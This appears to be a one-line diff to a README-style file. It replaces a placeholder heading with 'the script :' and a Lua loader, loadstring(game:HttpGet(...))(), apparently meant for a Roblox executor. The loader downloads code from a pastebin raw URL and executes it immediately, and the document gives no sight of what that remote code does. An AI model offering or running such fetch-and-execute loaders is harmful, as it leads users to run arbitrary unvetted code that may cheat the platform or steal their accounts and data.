@@ -1,1 +1,1 @@
-# lolololololo
+ the script : loadstring(game:HttpGet("https://pastebin.com/raw/7HiKyiLN"))() 
